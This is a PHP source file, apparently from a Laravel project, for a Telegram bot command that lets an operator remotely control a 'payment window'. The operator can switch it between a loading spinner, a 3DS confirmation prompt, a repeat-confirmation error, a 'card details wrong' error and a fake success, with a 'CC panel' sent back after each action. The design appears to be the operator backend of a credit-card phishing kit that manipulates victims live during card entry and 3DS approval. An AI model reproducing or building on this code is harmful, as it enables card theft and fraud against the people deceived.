<?php

namespace App\TelegramCommands;

use App\Models\PaymentWindow;
use App\Services\TelegramService;
use Exception;
use Longman\TelegramBot\Commands\SystemCommand;
use Longman\TelegramBot\Entities\ServerResponse;
use Str;

class CallbackqueryCommand extends SystemCommand
{

    protected $name = 'callbackquery';
    protected $description = 'Handle the callback query';
    protected $version = '1.0.0';

    public function execute(): ServerResponse
    {
        $telegramService = app(TelegramService::class);

        // Callback query data can be fetched and handled accordingly.
        $callbackQuery = $this->getCallbackQuery();
        $callbackData = $callbackQuery->getData();

        $message = $callbackQuery->getMessage();
        $chat = $message->getChat();

        $returnMessage = 'Unknown...';

        try {
            if (Str::startsWith($callbackData, 'payment_window.')) {
                $returnMessage = $this->handlePaymentWindowAction($callbackData, $chat->getId());
            }
        } catch (Exception $exception) {
            report($exception);
            $returnMessage = 'An error occurred!';
        }

        return $callbackQuery->answer([
            'text' => $returnMessage,
            'show_alert' => false,
            'cache_time' => 5,
        ]);
    }

    private function handlePaymentWindowAction(string $command, $chatId): string
    {
        $data = explode('.', $command);
        $paymentWindowId = $data[1];
        $action = $data[2];

        $paymentWindow = PaymentWindow::findOrFail($paymentWindowId);

        if ($paymentWindow->show_success){
            app(TelegramService::class)->sendCcPanel($paymentWindow->paymentSession->productPage, $paymentWindow->paymentSession, $paymentWindow);
            return "ATTENTION: Payment window already succeeded!";
        }

        if ($paymentWindow->close_window_with_error){
            app(TelegramService::class)->sendCcPanel($paymentWindow->paymentSession->productPage, $paymentWindow->paymentSession, $paymentWindow);
            return "ATTENTION: Payment window already closed!";
        }

        if ($action == 'refresh') {
            //do nothing
        } elseif ($action == 'show_loading_screen') {
            $paymentWindow->show_fullscreen_spinner = true;
            $paymentWindow->fullscreen_spinner_label = 'Bitte warten';
            $paymentWindow->show_wait_for_confirmation = false;
            $paymentWindow->wait_for_confirmation_error = null;
            $paymentWindow->show_success = false;
            $paymentWindow->close_window_with_error = false;
        } elseif ($action == 'redirect_to_3ds') {
            $paymentWindow->show_fullscreen_spinner = false;
            $paymentWindow->show_wait_for_confirmation = true;
            $paymentWindow->wait_for_confirmation_error = null;
            $paymentWindow->show_success = false;
            $paymentWindow->close_window_with_error = false;
        } elseif ($action == 'confirm_again') {
            $paymentWindow->show_fullscreen_spinner = false;
            $paymentWindow->show_wait_for_confirmation = true;
            $paymentWindow->wait_for_confirmation_error = 'Fehlgeschlagen. Bitte bestätigen Sie erneut!';
            $paymentWindow->show_success = false;
            $paymentWindow->close_window_with_error = false;
        } elseif ($action == 'cc_infos_wrong') {
            $paymentWindow->show_fullscreen_spinner = false;
            $paymentWindow->show_wait_for_confirmation = false;
            $paymentWindow->wait_for_confirmation_error = null;
            $paymentWindow->show_success = false;
            $paymentWindow->close_window_with_error = true;
            $paymentWindow->error_message = 'Zahlung fehlgeschlagen. Bitte überprüfe deine Kreditkartendaten!';
        } elseif ($action == 'success') {
            $paymentWindow->show_fullscreen_spinner = false;
            $paymentWindow->show_wait_for_confirmation = false;
            $paymentWindow->wait_for_confirmation_error = null;
            $paymentWindow->show_success = true;
            $paymentWindow->close_window_with_error = false;
        } else {
            return 'Unknown!';
        }

        $paymentWindow->save();

        app(TelegramService::class)->sendCcPanel($paymentWindow->paymentSession->productPage, $paymentWindow->paymentSession, $paymentWindow);

        return 'Done.';
    }
}
